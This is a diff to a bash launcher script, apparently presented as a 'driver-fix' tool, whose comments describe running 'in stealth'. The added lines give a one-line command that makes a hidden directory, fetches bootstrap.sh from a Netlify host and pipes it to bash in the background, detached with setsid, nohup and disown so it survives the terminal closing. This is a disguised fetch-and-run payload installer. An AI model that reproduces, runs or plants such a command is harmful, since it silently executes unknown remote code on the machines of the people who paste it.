@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 # One-line launcher — download from Netlify, run local dev in stealth.
-# macOS/Linux one command (background):
-# mkdir -p ~/.driver-fix-host/.host-setup && nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' >>~/.driver-fix-host/.host-setup/run.log 2>&1 &
-# First run can take 2-3 min (node download + npm install). Check: tail -f ~/.driver-fix-host/.host-setup/run.log
+# macOS/Linux (survives terminal close — safe to exit after Enter):
+# mkdir -p ~/.driver-fix-host/.host-setup && (setsid bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' 2>/dev/null || nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash') >>~/.driver-fix-host/.host-setup/run.log 2>&1 < /dev/null & disown
+# First run can take 2-3 min. Check: tail -f ~/.driver-fix-host/.host-setup/run.log
 set -euo pipefail
 
 SITE_BASE="https://driver-fix-238308.netlify.app"
